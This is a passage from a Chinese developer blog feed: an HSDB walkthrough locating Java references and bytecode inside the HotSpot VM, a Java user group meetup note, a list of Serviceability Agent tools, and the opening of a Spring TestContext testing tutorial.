0x00000000fa49a71c:  (padding):                    0x00000000 一个Test2的实例包含2个给VM用的隐含字段作为对象头，和0个Java字段。对象头的第一个字段是mark word，记录该对象的GC状态、同步状态、identity hash code之类的多种信息。对象头的第二个字段是个类型信息指针，klass pointer。这里因为默认开启了压缩指针，所以本来应该是64位的指针存在了32位字段里。最后还有4个字节是为了满足对齐需求而做的填充（padding）。以前在另一帖里也介绍过这部分内容，可以参考：借助HotSpot SA来一窥PermGen上的对象  顺带发张Inspector的截图来展示HotSpot VM里描述Test2类的VM对象长啥样吧。在菜单里选Tools -> Inspector，在地址里输入前面看到的klass地址： InstanceKlass存着Java类型的名字、继承关系、实现接口关系，字段信息，方法信息，运行时常量池的指针，还有内嵌的虚方法表（vtable）、接口方法表（itable）和记录对象里什么位置上有GC会关心的指针（oop map）等等。 留意到这个InstanceKlass是给VM内部用的，并不直接暴露给Java层；InstanceKlass不是java.lang.Class的实例。在HotSpot VM里，java.lang.Class的实例被称为“Java mirror”，意思是它是VM内部用的klass对象的“镜像”，把klass对象包装了一层来暴露给Java层使用。在InstanceKlass里有个_java_mirror字段引用着它对应的Java mirror，而mirror里也有个隐藏字段指向其对应的InstanceKlass。所以当我们写obj.getClass()，在HotSpot VM里实际上经过了两层间接引用才能找到最终的Class对象：obj->_klass->_java_mirror  在Oracle JDK7之前，Oracle/Sun JDK的HotSpot VM把Java类的静态变量存在InstanceKlass结构的末尾；从Oracle JDK7开始，为了配合PermGen移除的工作，Java类的静态变量被挪到Java mirror（Class对象）的末尾了。还有就是，在JDK7之前Java mirror存放在PermGen里，而从JDK7开始Java mirror默认也跟普通Java对象一样先从eden开始分配而不放在PermGen里。到JDK8则进一步彻底移除了PermGen，把诸如klass之类的元数据都挪到GC堆之外管理，而Java mirror的处理则跟JDK7一样。 ============================================================================= 前面对HSDB的操作和HotSpot VM里的一些内部数据结构有了一定的了解，现在让我们回到主题：找指针！ HotSpot VM内部使用直接指针来实现Java引用。在64位环境中有可能启用“压缩指针”的功能把64位指针压缩到只用32位来存。压缩指针与非压缩指针直接有非常简单的1对1对应关系，前者可以看作后者的特例。 于是我们要找t1、t2、t3这三个变量，等同于找出存有指向上述3个Test2实例的地址的存储位置。 不嫌麻烦的话手工扫描内存去找也能找到，不过幸好HSDB内建了revptrs命令，可以找出“反向指针”——如果a变量引用着b对象，那么从b对象出发去找a变量就是找一个“反向指针”。 先拿第一个Test2的实例试试看：hsdb> revptrs 0x00000000fa49a710
Computing reverse pointers...
Done.
null
Oop for java/lang/Class @ 0x00000000fa499b00 还真的找到了一个包含指向Test2实例的指针，在一个java.lang.Class的实例里。用whatis命令来看看这个Class对象在哪里：hsdb> whatis 0x00000000fa499b00
Address 0x00000000fa499b00: In thread-local allocation buffer for thread "main" (1)  [0x00000000fa48f490,0x00000000fa49a750,0x00000000fa49d118)
 
 可以看到这个Class对象也在eden里，具体来说在main线程的TLAB里。 这个Class对象是如何引用到Test2的实例的呢？再用inspect命令：hsdb> inspect 0x00000000fa499b00
instance of Oop for java/lang/Class @ 0x00000000fa499b00 @ 0x00000000fa499b00 (size = 120)
<<Reverse pointers>>: 
t1: Oop for Test2 @ 0x00000000fa49a710 Oop for Test2 @ 0x00000000fa49a710 可以看到，这个Class对象里存着Test类的静态变量t1，指向着第一个Test2实例。 成功找到t1了！这个有点特别，本来JVM规范里也没明确规定静态变量要存在哪里，通常认为它应该在概念中的“方法区”里；但现在在JDK7的HotSpot VM里它实质上也被放在Java heap里了。可以把这种特例看作是HotSpot VM把方法区的一部分数据也放在Java heap里了。前面也已经提过，在JDK7之前的Oracle/Sun JDK里的HotSpot VM把静态变量存在InstanceKlass末尾，存在PermGen里。那个时候的PermGen更接近于完整的方法区一些。 关于PermGen移除计划的一些零星笔记可以参考我以前一老帖。 再接再厉，用revptrs看看第二个Test2实例有谁引用：hsdb> revptrs 0x00000000fa49a730
Oop for Test @ 0x00000000fa49a720 找到了一个Test实例。同样用whatis来看看它在哪儿：hsdb> whatis 0x00000000fa49a720
Address 0x00000000fa49a720: In thread-local allocation buffer for thread "main" (1)  [0x00000000fa48f490,0x00000000fa49a750,0x00000000fa49d118)
 
 果然也在main线程的TLAB里。然后看这个Test实例的内容：hsdb> inspect 0x00000000fa49a720
instance of Oop for Test @ 0x00000000fa49a720 @ 0x00000000fa49a720 (size = 16)
<<Reverse pointers>>: 
_mark: 1
t2: Oop for Test2 @ 0x00000000fa49a730 Oop for Test2 @ 0x00000000fa49a730 可以看到这个Test实例里有个成员字段t2，指向了第二个Test2实例。 于是t2也找到了！在Java堆里，作为Test的实例的成员字段存在。  那么赶紧试试用revptrs命令看第三个Test2实例：hsdb> revptrs 0x00000000fa49a740
null 啥？没找到？！SA这也太弱小了吧。明明就在那里…回头我会做个补丁让新版HotSpot VM的SA能处理这种情况。 这个时候的HSDB界面全貌：  0x00000000fa49a740看起来有没有点眼熟？回到前面打开的Stack Memory窗口看，仔细看会发现那个窗口里正好就有0x00000000fa49a740这数字，位于0x000000000287f858地址上。 实际情况是，下面这张图里红色框住的部分就是main线程上Test.fn()的调用对应的栈帧： 如果图里看得不清楚的话，我再用文字重新写一遍（两道横线之间的是Test.fn()的栈帧内容，前后的则是别的东西）：0x000000000287f7f0: 0x0000000002886298 
0x000000000287f7f8: 0x0000000002893ca5 
0x000000000287f800: 0x0000000002893ca5 
-------------------------------------------------------------------------------------------------------------
Stack frame for Test.fn() @bci=8, line=6, pc=0x0000000002893ca5, methodOop=0x00000000fb077f78 (Interpreted frame)
0x000000000287f808: 0x000000000287f808 expression stack bottom          <- rsp
0x000000000287f810: 0x00000000fb077f58 bytecode pointer    = 0x00000000fb077f50 (base) + 8 (bytecode index) in PermGen
0x000000000287f818: 0x000000000287f860 pointer to locals
0x000000000287f820: 0x00000000fb078360 constant pool cache = ConstantPoolCache for Test in PermGen
0x000000000287f828: 0x0000000000000000 method data oop     = null
0x000000000287f830: 0x00000000fb077f78 method oop          = Method for Test.fn()V in PermGen
0x000000000287f838: 0x0000000000000000 last Java stack pointer (not set)
0x000000000287f840: 0x000000000287f860 old stack pointer (saved rsp)
0x000000000287f848: 0x000000000287f8a8 old frame pointer (saved rbp)    <- rbp
0x000000000287f850: 0x0000000002886298 return address      = in interpreter codelet "return entry points" [0x00000000028858b8, 0x00000000028876c0)  7688 bytes
0x000000000287f858: 0x00000000fa49a740 local[1] "t3"       = Oop for Test2 in NewGen
0x000000000287f860: 0x00000000fa49a720 local[0] "this"     = Oop for Test in NewGen
-------------------------------------------------------------------------------------------------------------
0x000000000287f868: 0x000000000287f868 
0x000000000287f870: 0x00000000fb077039 
0x000000000287f878: 0x000000000287f8c0 
0x000000000287f880: 0x00000000fb077350 
0x000000000287f888: 0x0000000000000000 
0x000000000287f890: 0x00000000fb077060 
0x000000000287f898: 0x000000000287f860 
0x000000000287f8a0: 0x000000000287f8c0 
0x000000000287f8a8: 0x000000000287f9a0 
0x000000000287f8b0: 0x000000000288062a 
0x000000000287f8b8: 0x00000000fa49a720 
0x000000000287f8c0: 0x00000000fa498ea8 
0x000000000287f8c8: 0x0000000000000000 
0x000000000287f8d0: 0x0000000000000000 
0x000000000287f8d8: 0x0000000000000000   回顾JVM规范里所描述的Java栈帧结构，包括：[ 操作数栈  (operand stack)   ]
[ 栈帧信息  (dynamic linking) ]
[ 局部变量区 (local variables) ]  上张我以前做的投影稿里的图：  再跟HotSpot VM的解释器所使用的栈帧布局对比看看，是不是正好能对应上？局部变量区（locals）有了，VM所需的栈帧信息也有了；执行到这个位置operand stack正好是空的所以看不到它。（HotSpot VM里把operand stack叫做expression stack。这是因为operand stack通常只在表达式求值过程中才有内容） 从Test.fn()的栈帧中我们可以看到t3变量就在locals[1]的位置上。t3变量也找到了！大功告成！  栈帧信息里具体都是些啥，以后有机会再展开讲吧。 都看到这里了，干脆把main方法的栈帧也如法炮制分析一下。先上图： 然后再用文字写一次：0x000000000287f7f0: 0x0000000002886298 
0x000000000287f7f8: 0x0000000002893ca5 
0x000000000287f800: 0x0000000002893ca5 
0x000000000287f808: 0x000000000287f808 
0x000000000287f810: 0x00000000fb077f58 
0x000000000287f818: 0x000000000287f860 
0x000000000287f820: 0x00000000fb078360 
0x000000000287f828: 0x0000000000000000 
0x000000000287f830: 0x00000000fb077f78 
0x000000000287f838: 0x0000000000000000 
0x000000000287f840: 0x000000000287f860 
0x000000000287f848: 0x000000000287f8a8 
0x000000000287f850: 0x0000000002886298 
0x000000000287f858: 0x00000000fa49a740 
-------------------------------------------------------------------------------------------------------------
Stack frame for Main.main(java.lang.String[]) @bci=9, line=4, pc=0x0000000002886298, methodOop=0x00000000fb077060 (Interpreted frame)
0x000000000287f860: 0x00000000fa49a720 expression stack[0] = Oop for Test in NewGen
0x000000000287f868: 0x000000000287f868 expression stack bottom
0x000000000287f870: 0x00000000fb077039 bytecode pointer    = 0x00000000fb077030 (base) + 9 (bytecode index) in PermGen
0x000000000287f878: 0x000000000287f8c0 pointer to locals
0x000000000287f880: 0x00000000fb077350 constant pool cache = ConstantPoolCache for Main in PermGen
0x000000000287f888: 0x0000000000000000 method data oop     = null
0x000000000287f890: 0x00000000fb077060 method oop          = Method for Main.main([Ljava/lang/String;)V in PermGen
0x000000000287f898: 0x000000000287f860 last Java stack pointer
0x000000000287f8a0: 0x000000000287f8c0 old stack pointer
0x000000000287f8a8: 0x000000000287f9a0 old frame pointer
0x000000000287f8b0: 0x000000000288062a return address      = in StubRoutines
0x000000000287f8b8: 0x00000000fa49a720 local[1] "test"     = Oop for Test in NewGen
0x000000000287f8c0: 0x00000000fa498ea8 local[0] "args"     = Oop for java.lang.String[] in NewGen
-------------------------------------------------------------------------------------------------------------
0x000000000287f8c8: 0x0000000000000000 
0x000000000287f8d0: 0x0000000000000000 
0x000000000287f8d8: 0x0000000000000000  main的栈帧的operand stack就不是空的了，有一个元素，用来传递参数给其调用的Test.fn()方法（作为“this”）。仔细的同学可能发现了，0x000000000287f860这个地址前面不是说是调用Test.fn()产生的栈帧么？怎么这里又变成调用main()方法的栈帧的一部分了呢？ 其实栈帧直接可以有重叠：（再上一张以前做的投影稿里的图） 这样可以减少传递参数所需的数据拷贝，也节省了空间。  回到HSDB，我们换个方式来把t3变量找出来。这里就需要编译Test.java时给的-g参数所生成的LocalVariableTable的信息了：hsdb> jseval "ts = jvm.threads"
[Thread (address=0x00000000fa48fb38, name=Service Thread), Thread (address=0x00000000fa48fa18, name=C2 CompilerThread1), Thread (address=0x00000000fa48f8f8, name=C2 CompilerThread0), Thread (address=0x00000000fa49d178, name=JDWP Command Reader), Thread (address=0x00000000fa48f820, name=JDWP Event Helper Thread), Thread (address=0x00000000fa48f6d8, name=JDWP Transport Listener: dt_shmem), Thread (address=0x00000000fa48dc88, name=Attach Listener), Thread (address=0x00000000fa48db68, name=Signal Dispatcher), Thread (address=0x00000000fa405828, name=Finalizer), Thread (address=0x00000000fa4053a0, name=Reference Handler), Thread (address=0x00000000fa404860, name=main)] 
hsdb> jseval "t = ts[ts.length - 1]"
Thread (address=0x00000000fa404860, name=main) 
hsdb> jseval "fs = t.frames"
[Frame (method=Test.fn(), bci=8, line=6), Frame (method=Main.main(java.lang.String[]), bci=9, line=4)] 
hsdb> jseval "f0 = fs[0]"
Frame (method=Test.fn(), bci=8, line=6) 
hsdb> jseval "f1 = fs[1]"
Frame (method=Main.main(java.lang.String[]), bci=9, line=4) 
hsdb> jseval "f0.locals"
{t3=Object 0x00000000fa49a740} 
hsdb>   ============================================================================= 上面讲栈帧布局的时候出现了“bytecode pointer”字眼。既然之前被不少好奇的同学问过“JVM里字节码存在哪里”，这里就一并回答掉好了。 强调一点：“字节码”只是元数据的一部分。它只负责描述运行逻辑，而其它信息像是类型名、成员的个数、类型、名字等等都不是字节码。在Class文件里是如此，到运行时在JVM里仍然是如此。 HotSpot VM里有一套对象专门用来存放元数据，它们包括：  Klass系对象。元数据的最主要入口。用于描述类型的总体信息 ConstantPool/ConstantPoolCache对象。每个InstanceKlass关联着一个ConstantPool，作为该类型的运行时常量池。这个常量池的结构跟Class文件里的常量池基本上是对应的。可以参考我以前的一个回帖。ConstantPoolCache主要用于存储某些字节码指令所需的解析（resolve）好的常量项，例如给[get|put]static、[get|put]field、invoke[static|special|virtual|interface|dynamic]等指令对应的常量池项用。 Method对象，用来描述Java方法的总体信息，像是方法入口地址、调用/循环计数器等等 ConstMethod对象，记录着Java方法的不变的描述信息，包括方法名、方法的访问修饰符、字节码、行号表、局部变量表等等。注意了，字节码就嵌在这ConstMethod对象里面。 Symbol对象，对应Class文件常量池里的JVM_CONSTANT_Utf8类型的常量。有一个VM全局的SymbolTable管理着所有Symbol。Symbol由所有Java类所共享。 MethodData对象，记录着Java方法执行时的profile信息，例如某方法里的某个字节码之类是否从来没遇到过null，某个条件跳转是否总是走同一个分支，等等。这些信息在解释器（多层编译模式下也在低层的编译生成的代码里）收集，然后供给HotSpot Server Compiler用于做激进优化。  在PermGen移除前，上述元数据对象都在PermGen里，直接被GC管理着。JDK8彻底移除PermGen后，这些对象被挪到GC堆外的一块叫做Metaspace的空间里做特殊管理，仍然间接的受GC管理。 介绍了背景，让我们回到HSDB里。前面不是说“bytecode pointer (bcp)”嘛，从背景介绍可以知道字节码存在ConstMethod对象里，那就让我们用Test.fn()栈帧里存的bcp来验证一下是否真的如此。还是用whatis命令：hsdb> whatis 0x00000000fb077f58
Address 0x00000000fb077f58: In perm generation   perm [0x00000000fae00000,0x00000000fb078898,0x00000000fc2c0000) space capacity = 21757952, 11.90770160721009 used 
 这地址确实在PermGen里了。那么inspect一下看看？hsdb> inspect 0x00000000fb077f58
Error: sun.jvm.hotspot.debugger.UnalignedAddressException: 100011
 呃，这样不行。inspect命令只能接受对象的起始地址，但字节码是嵌在ConstMethod对象中间的。 那换条路子。栈帧里还有method oop，指向该栈帧对应的Method对象。先从它入手：hsdb> inspect 0x00000000fb077f78
instance of Method fn()V@0x00000000fb077f78 @ 0x00000000fb077f78 @ 0x00000000fb077f78 (size = 136)
_mark: 1
_constMethod: ConstMethod fn()V@0x00000000fb077f08 @ 0x00000000fb077f08 Oop @ 0x00000000fb077f08
_constants: ConstantPool for Test @ 0x00000000fb077c68 Oop @ 0x00000000fb077c68
_method_size: 17
_max_stack: 2
_max_locals: 2
_size_of_parameters: 1
_access_flags: 1
 这样就找到了Test.fn()的Method对象，看到里面的_constMethod字段所指向的ConstMethod对象：hsdb> inspect 0x00000000fb077f08
instance of ConstMethod fn()V@0x00000000fb077f08 @ 0x00000000fb077f08 @ 0x00000000fb077f08 (size = 112)
_mark: 1
_method: Method fn()V@0x00000000fb077f78 @ 0x00000000fb077f78 Oop @ 0x00000000fb077f78
_exception_table: [I @ 0x00000000fae01d50 Oop for [I @ 0x00000000fae01d50
_constMethod_size: 14
_flags: 5
_code_size: 9
_name_index: 18
_signature_index: 12
_generic_signature_index: 0
_code_size: 9
 这个ConstMethod对象从0x00000000fb077f08开始，长度112字节，也就是这个对象的范围是[0x00000000fb077f08, 0x00000000fb077f78)。bcp指向0x00000000fb077f58，确实在这个ConstMethod范围内。 通过经验可以知道实际上这里字节码的起始地址是0x00000000fb077f50。经验就是：字节码是ConstMethod内嵌的第一个变长表，紧帖在ConstMethod的最后一个显式C++字段后面。所以只要知道sizeof(constMethodOopDesc)，字节码就会从这个偏移量开始。通过ConstMethod的_code_size字段可以知道该方法的字节码有9字节。找出来用mem命令看看内存里的数据：hsdb> mem 0x00000000fb077f50 2
0x00000000fb077f50: 0x4c0001b7590200ca 
0x00000000fb077f58: 0x00000000004105b1   这串数字是什么东西呢？展开来写清楚一点就是：0x00000000fb077f50:  bb 00 02  new <cp index #2> [Class Test2]
0x00000000fb077f53:  59        dup
0x00000000fb077f54:  b7 01 00  invokespecial <cp cache index #1> [Method Test2.<init>()V]
0x00000000fb077f57:  4c        astore_1
0x00000000fb077f58:  b1        return  眼尖的同学要吐槽了：在0x00000000fb077f50的字节不是0xca么，怎么变成0xbb了？其实0xca是JVM规范里有描述的一个可选字节码指令，breakpoint 0x00000000fb077f50:  ca 00 02  breakpoint // 00 02 not used 还记得本文的实验一开始用了jdb在Test.fn()的入口设置了断点吗？这就是结果——入口处的字节码指令被改写为breakpoint了。当然，原本的字节码指令也还在别的地方存着，等断点解除之后这个位置就会被恢复成原本的0xbb指令。 把ConstMethod里存的字节码跟Class文件里存的比较一下看看。用javap工具来看Class文件的内容：  public void fn();
    Code:
      stack=2, locals=2, args_size=1
         0:  bb 00 02  new           #2                  // class Test2
         3:  59        dup
         4:  b7 00 03  invokespecial #3                  // Method Test2."<init>":()V
         7:  4c        astore_1
         8:  b1        return 几乎一模一样。唯一的不同也是个有趣的小细节：invokespecial的参数的常量池号码不一样了。HotSpot VM执行new指令的时候用的还是Class文件里的常量池号和字节序。而在执行invokespecial时，光是ConstantPool里的的常量项不够地方放解析（resolve）出来的信息，所以把这些信息放在ConstantPoolCache里，然后也把invokespecial指令里的参数改写过来，顺带变成了平台相关的字节序。 同样也看看Main.main()方法。内存内容：hsdb> mem 0x00000000fb077030 2
0x00000000fb077030: 0x4c0001b7590200bb 
0x00000000fb077038: 0x214103b10002b62b  展开来注解：0x00000000fb077030:  bb 00 02  new <cp index #2> [Class Test]
0x00000000fb077033:  59        dup
0x00000000fb077034:  b7 01 00  invokespecial <cp cache index #1> [Method Test.<init>()V]
0x00000000fb077037:  4c        astore_1
0x00000000fb077038:  2b        aload_1
0x00000000fb077039:  b6 02 00  invokevirtual <cp cache index #2> [Method Test.fn()V]
0x00000000fb07703c:  b1        return 对应的javap输出：  public static void main(java.lang.String[]);
    Code:
      stack=2, locals=2, args_size=1
         0:  bb 00 02  new           #2                  // class Test
         3:  59        dup
         4:  b7 00 03  invokespecial #3                  // Method Test."<init>":()V
         7:  4c        astore_1
         8:  2b        aload_1
         9:  b6 00 04  invokevirtual #4                  // Method Test.fn:()V
        12:  b1        return  好，今天就写到这里吧～
              
              
已有 16 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
记GreenTeaJUG第二次线下活动(杭州）, rednaxelafx.iteye.com.blog.1814180, Mon, 25 Feb 2013 12:33:40 +0800
新浪微活动页面：http://event.weibo.com/753079  活动内容：引用活动主题：  会场一 万松书院（偏向应用层）：  @琴上的日月：《淘宝WEBOS.面向积木编程.分形架构》（45分钟）  @淘宝君山：《Velocity的优化》（45分钟）  @淘宝叔同：《淘宝前台应用性能优化实践》（45分钟）  @温高铁：《各种API的性能、编码优化技巧》（45分钟）  剩余时间交流答疑  会场二 三味书屋（偏向底层）：  @MinZhou：《Java程序员也要了解CPU》（1小时）  @RednaxelaFX：《Intrinsic Methods in HotSpot VM》（1小时）  @王王争：《让Java的世界能够利用PMU的历史》（1小时）  剩余时间交流答疑  （@RednaxelaFX 会做一个关于HotSpot VM Serviceability Agent的演示）  我的演讲的演示稿，《Intrinsic Methods in HotSpot VM》：SlideShare, 新浪微盘 Intrinsic method在别的环境里也叫做built-in function；另外，针对intrinsic method的内联在某些地方也叫做semantic inlining。可以参考Efficient Support for Complex Numbers in Java, Peng Wu, Sam Midkiff, José Moreira, Manish Gupta, 1999Improving Java Performance Through Semantic Inlining, Peng Wu, Sam Midkiff, José Moreira, Manish Gupta, 1998（IBM就喜欢把什么东西都起个新名字安上… ）这两篇论文里提到的semantic inlining强调“原本的intrinsic”只对操作进行特化，而semantic inlining则既对操作也对数据（类型）进行特化。实际上为了这差异发明个新名字也就是为了写论文吧…HotSpot VM里，C2实现的StringBuilder|Buffer.append()的intrinsic在内部也是不构造Java层面的char[]来累加字符串内容，而是在native memory里找块空间来做这事情，跟semantic inlining所说的效果也类似吧。 其他演讲者的演示稿等@坤谷整理好放在这里了：http://yunpan.alibaba.com/share/link/L4OU3zA6  @温高铁：《各种API的性能、编码优化技巧》 新浪微盘  ================================================================== 关于HotSpot VM Serviceability Agent的演示    我以前在这ItEye上也写过一些关于HotSpot Serviceability Agent的笔记。最近大概是这篇：关于sa-jdi.jar与tools.jar里的工具的讨论 以前例如：2011-06-20: 回复：请问，jvm实现读取class文件常量池信息是怎样呢？ 2010-08-05: 借助HotSpot SA来一窥PermGen上的对象 2010-08-04: 借助HotSpot SA来反汇编 2010-08-03: 如何dump出一个Java进程里的类对应的Class文件？  更新：加上新帖：2013-04-16: 借HSDB来探索HotSpot VM的运行时数据  这次做的演示以CLHSDB和HSDB为主。以后有空再写个Serviceability Agent的入门演示稿吧。如果有兴趣自己基于SA API来写小工具，这里有个我写的基于SA的工具的列表，可以参考：http://rednaxelafx.iteye.com/blog/1814429  CLHSDB是command line HotSpot debugger的缩写，顾名思义是个命令行界面的、专门用于调试HotSpot VM的调试器。它的用法可以搜一下"rednaxelafx clhsdb"关键字，我在Github gist上发过很多例子。最简单的启动方式如下：java -cp $JAVA_HOME/lib/sa-jdi.jar sun.jvm.hotspot.CLHSDB （在某些系统上可能需要在前面加上sudo以获得足够权限去连接到目标进程上；另外有可能需要进一步设置ptrace_scope的值） HSDB则是图形界面版的HotSpot调试器。它的启动方式与CLHSDB类似，java -cp $JAVA_HOME/lib/sa-jdi.jar sun.jvm.hotspot.HSDB HSDB的截屏图：   VisualVM里的SAPlugin实际上就是HSDB里的部分功能的移植版。  
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[链接列表] 我写的一些基于HotSpot Serviceability Agent的小工具, rednaxelafx.iteye.com.blog.1814429, Mon, 25 Feb 2013 12:33:22 +0800
DumpClassURL: print the list of currently loaded Java classes, along with code source path and defining class loader information打印出HotSpot VM里当前加载的所有类的路径和加载器摘要信息的工具 DirectMemorySize: Print NIO direct memory usage stats, as an alternative on JDK6 without JMX support for direct memory monitoring打印NIO direct memory使用状况的工具 JMapHistoGenerational: an extension to "jmap -histo", prints generational stats of GC heap usage增强版jmap -histo，显示分代信息 PrintInvokedMethods: print the list of Java methods invoked at least once in HotSpot VM(discussion on hotspot-dev mailing list: http://mail.openjdk.java.net/pipermail/hotspot-dev/2012-May/005809.html)基于SA打印HotSpot VM执行过的Java方法的列表 =========================================================== add "objtree" command to CLHSDB: prints the object graph starting from the specified root as a depth-first traversal tree给CLHSDB加一个objtree命令来方便看对象的引用状况
              
              
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Spring基于注解TestContext 测试框架使用详解, lizhuangs.iteye.com.blog.2064179, Fri, 09 May 2014 09:55:46 +0800

原创整理不易，转载请注明出处：Spring基于注解TestContext 测试框架使用详解
代码下载地址：http://www.zuidaima.com/share/1775574182939648.htm
概述
Spring 2.5 相比于 Spring 2.0 所新增的最重要的功能可以归结为以下 3 点：
基于注解的 IoC 功能；
基于注解驱动的 Spring MVC 功能；
基于注解的 TestContext 测试框架。
Spring 推荐开发者使用新的基于注解的 TestContext 测试框架，本文我们将对此进行详细的讲述。
低版本的 Spring 所提供的 Spring 测试框架构在 JUnit 3.8 基础上扩展而来，它提供了若干个测试基类。而 Spring 2.5 所新增的基于注解的 TestContext 测试框架和低版本的测试框架没有任何关系。它采用全新的注解技术可以让 POJO 成为 Spring 的测试用例，除了拥有旧测试框架所有功能外，TestContext 还添加了一些新的功能，TestContext 可以运行在 JUnit 3.8、JUnit 4.4、TestNG 等测试框架下。
回页首
直接使用 JUnit 测试 Spring 程序存在的不足
在拙作《精通 Spring 2.x — 企业应用开发详解》一书中，笔者曾经指出如果直接使用 JUnit 测试基于 Spring 的程序，将存在以下 4 点明显的不足：
导致 Spring 容器多次初始化问题：根据 JUnit 测试用例的调用流程，每执行一个测试方法都会重新创建一个测试用例实例并调用其 setUp() 方法。由于在一般情况下，我们都在 setUp() 方法中初始化 Spring 容器，这意味着测试用例中有多少个测试方法，Spring 容器就会被重复初始化多少次。
需要使用硬编码方式手工获取 Bean：在测试用例中，我们需要通过 ApplicationContext.getBean() 的方法从 Spirng 容器中获取需要测试的目标 Bean，并且还要进行造型操作。
数据库现场容易遭受破坏：测试方法可能会对数据库记录进行更改操作，破坏数据库现场。虽然是针对开发数据库进行测试工作的，但如果数据操作的影响是持久的，将会形成积累效应并影响到测试用例的再次执行。举个例子，假设在某个测试方法中往数据库插入一条 ID 为 1 的 t_user 记录，第一次运行不会有问题，第二次运行时，就会因为主键冲突而导致测试用例执行失败。所以测试用例应该既能够完成测试固件业务功能正确性的检查，又能够容易地在测试完成后恢复现场，做到踏雪无迹、雁过无痕。
不容易在同一事务下访问数据库以检验业务操作的正确性：当测试固件操作数据库时，为了检测数据操作的正确性，需要通过一种方便途径在测试方法相同的事务环境下访问数据库，以检查测试固件数据操作的执行效果。如果直接使用 JUnit 进行测试，我们很难完成这项操作。
Spring 测试框架是专门为测试基于 Spring 框架应用程序而设计的，它能够让测试用例非常方便地和 Spring 框架结合起来，以上所有问题都将迎刃而解。
一个需要测试的 Spring 服务类
在具体使用 TextContext 测试框架之前，我们先来认识一下需要测试的 UserService 服务类。UserService 服务类中拥有一个处理用户登录的服务方法，其代码如下所示：
清单1. UserService.java 需要测试的服务类
package com.baobaotao.service;
import com.baobaotao.domain.LoginLog;
import com.baobaotao.domain.User;
import com.baobaotao.dao.UserDao;
import com.baobaotao.dao.LoginLogDao;
public class UserService{
    private UserDao userDao;
    private LoginLogDao loginLogDao;
    public void handleUserLogin(User user) {
        user.setCredits( 5 + user.getCredits());
        LoginLog loginLog = new LoginLog();
        loginLog.setUserId(user.getUserId());
        loginLog.setIp(user.getLastIp());
        loginLog.setLoginTime(user.getLastVisit());
        userDao.updateLoginInfo(user);
        loginLogDao.insertLoginLog(loginLog);
    }
    //省略get/setter方法
}
UserService 需要调用 DAO 层的 UserDao 和 LoginLogDao 以及 User 和 LoginLog 这两个 PO 完成业务逻辑，User 和 LoginLog分别对应 t_user 和 t_login_log 这两张数据库表。
在用户登录成功后调用 UserService 中的 handleUserLogin() 方法执行用户登录成功后的业务逻辑：
登录用户添加 5 个积分（t_user.credits）；
登录用户的最后访问时间（t_user.last_visit）和 IP（t_user.last_ip）更新为当前值；
在日志表中（t_login_log）中为用户添加一条登录日志。
这是一个需要访问数据库并存在数据更改操作的业务方法，它工作在事务环境下。下面是装配该服务类 Bean 的 Spring 配置文件：
清单2. applicationContext.xml：Spring 配置文件，放在类路径下
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:p="http://www.springframework.org/schema/p"
    xmlns:tx="http://www.springframework.org/schema/tx"
xmlns:aop="http://www.springframework.org/schema/aop"
xmlns:context="http://www.springframework.org/schema/context"
xsi:schemaLocation="http://www.springframework.org/schema/beans 
http://www.springframework.org/schema/beans/spring-beans-2.5.xsd
     http://www.springframework.org/schema/tx 
http://www.springframework.org/schema/tx/spring-tx-2.5.xsd
     http://www.springframework.org/schema/aop 
http://www.springframework.org/schema/aop/spring-aop-2.5.xsd">
    <!-- 配置数据源  -->
<bean id="dataSource"
class="org.apache.commons.dbcp.BasicDataSource"
destroy-method="close"
        p:driverClassName="com.mysql.jdbc.Driver"
        p:url="jdbc:mysql://localhost/sampledb"
        p:username="root"
        p:password="1234"/>
    
    <!-- 配置Jdbc模板  -->
<bean id="jdbcTemplate" class="org.springframework.jdbc.core.JdbcTemplate"
            p:dataSource-ref="dataSource"/>
    <!-- 配置dao  -->
<bean id="loginLogDao"class="com.baobaotao.dao.LoginLogDao"
           p:jdbcTemplate-ref="jdbcTemplate"/>
<bean id="userDao" class="com.baobaotao.dao.UserDao" 
p:jdbcTemplate-ref="jdbcTemplate"/>
<!-- 事务管理器 -->
<bean id="transactionManager"
      class="org.springframework.jdbc.datasource.DataSourceTransactionManager"
           p:dataSource-ref="dataSource"/>
<bean id="userService" class="com.baobaotao.service.UserService"
             p:userDao-ref="userDao" p:loginLogDao-ref="loginLogDao"/>
    <!-- 使用aop/tx命名空间配置事务管理,这里对service包下的服务类方法提供事务-->
    <aop:config>
<aop:pointcut id="jdbcServiceMethod"
expression= "within(com.baobaotao.service..*)" />
<aop:advisor pointcut-ref="jdbcServiceMethod" advice-ref="jdbcTxAdvice" />
    </aop:config>
    <tx:advice id="jdbcTxAdvice" transaction-manager="transactionManager">
<tx:attributes>
            <tx:method name="*"/>
        </tx:attributes>
</tx:advice>
</beans>
UserService 所关联的 DAO 类和 PO 类都比较简单，请参看本文附件的程序代码。在着手测试 UserSerivce 之前，需要将创建数据库表，你可以在附件的 schema 目录下找到相应的 SQL 脚本文件。
回页首
编写 UserService 的测试用例
下面我们为 UserService 编写一个简单的测试用例类，此时的目标是让这个基于 TestContext 测试框架的测试类运行起来，我们将在后面逐步完善这个测试用例。
清单3.TestUserService.java: 基于注解的测试用例
package com.baobaotao.service;
import org.springframework.test.context.junit4.
    AbstractTransactionalJUnit4SpringContextTests;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.beans.factory.annotation.Autowired;
import org.junit.Test;
import com.baobaotao.domain.User;
import java.util.Date;
@ContextConfiguration  //①
public class TestUserService extends 
    AbstractTransactionalJUnit4SpringContextTests {
   
@Autowired  //②
   private UserService userService;
   @Test  //③
   public void handleUserLogin(){
       User user = new User();
       user.setUserId(1);
       user.setLastIp("127.0.0.1");
       Date now = new Date();
       user.setLastVisit(now.getTime());
       userService.handleUserLogin(user);
   }
}
这里，我们让 TestUserService 直接继承于 Spring 所提供的 AbstractTransactionalJUnit4SpringContextTests 的抽象测试类，稍后本文将对这个抽象测试类进行剖析，这里你仅须知道该抽象测试类的作用是让 TestContext 测试框架可以在 JUnit 4.4 测试框架基础上运行起来就可以了。
